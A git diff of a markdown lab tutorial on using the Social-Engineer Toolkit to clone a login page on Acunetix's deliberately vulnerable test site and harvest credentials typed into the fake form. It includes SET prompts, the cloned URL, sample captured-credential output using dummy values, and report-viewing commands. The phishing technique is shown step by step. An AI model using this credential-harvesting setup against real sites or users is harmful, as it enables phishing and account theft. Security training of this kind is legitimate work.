@@ -92,31 +92,30 @@ set:webattack> IP address for the POST back in Harvester/Tabnabbing:
 Type your local machine IP. To find it, open **another terminal** and run:
 
 ```bash
-ip a | grep "inet " | grep -v 127
+ifconfig ens5 | grep inet | cut -d" " -f10
 ```
 
-Use the IP shown (usually something like `192.168.x.x`). Type it and press Enter
+Use the IPv4 shown (something like `10.x.x.x`). Type it and press Enter
+
+<img width="675" height="92" alt="2026-04-08_12-18" src="https://github.com/user-attachments/assets/2ae88884-8266-4b9e-9892-1e490914be09" />
+
 
 ### Enter the site to clone
 
 SET will ask which URL to clone:
 
 ```
-set:webattack> Enter the url to clone: http://testphp.vulnweb.com/login.php
+set:webattack> Enter the url to clone: http://testaspnet.vulnweb.com/login.aspx
 ```
 
-> We are cloning **testphp.vulnweb.com** - this is a **deliberately vulnerable test site** created by Acunetix specifically for security testing. It is safe and legal to use
+> We are cloning **http://testaspnet.vulnweb.com/login.aspx** - this is a **deliberately vulnerable test site** created by Acunetix specifically for security testing. It is safe and legal to use
 
 SET will clone the site and start a web server on port **80**.
 
 You will see:
 
-```
-[*] Cloning the website: http://testphp.vulnweb.com/login.php
-[*] This could take a little bit...
-[*] Harvester is ready, have victim go to your site.
-[*] Saving harvested credentials to /var/www/...
-```
+<img width="1400" height="279" alt="2026-04-08_12-21" src="https://github.com/user-attachments/assets/4b7bd96f-78f1-408c-bf68-c30f4a0beb0b" />
+
 
 ### Open the fake site in your browser
 
@@ -131,18 +130,14 @@ You will see a **pixel-perfect clone** of the login page. Go ahead and type in s
 - **Username:** `testuser`
 - **Password:** `Password123`
 
-Click the login button.
+Click the login button
 
 ### Watch SET capture the credentials
 
 Go back to your terminal where SET is running. You will see the captured data printed in **real time**:
 
-```
-[*] WE GOT A HIT! Printing the output:
-POSSIBLE USERNAME FIELD FOUND: tfUName=testuser
-POSSIBLE PASSWORD FIELD FOUND: tfUPass=Password123
-[*] WHEN YOUR FINISHED, HIT CONTROL-C TO GENERATE A FULL REPORT.
-```
+<img width="948" height="414" alt="2026-04-08_12-24" src="https://github.com/user-attachments/assets/3853a2f9-5264-4aae-b53e-a66ce53d1e21" />
+
 
 SET captured everything typed into the fake form - **username, password, and more** - without the "victim" knowing anything happened
 
@@ -150,15 +145,12 @@ SET captured everything typed into the fake form - **username, password, and mor
 
 Press `CTRL+C` to stop the server. SET will automatically generate a report saved to:
 
-```bash
-/root/.set/reports/
-```
+<pre>/root/.set/reports/</pre>
 
 View it:
 
 ```bash
-ls /root/.set/reports/
-cat /root/.set/reports/*.xml
+sudo sh -c 'cat /root/.set/reports/*.xml'
 ```
 
 ---
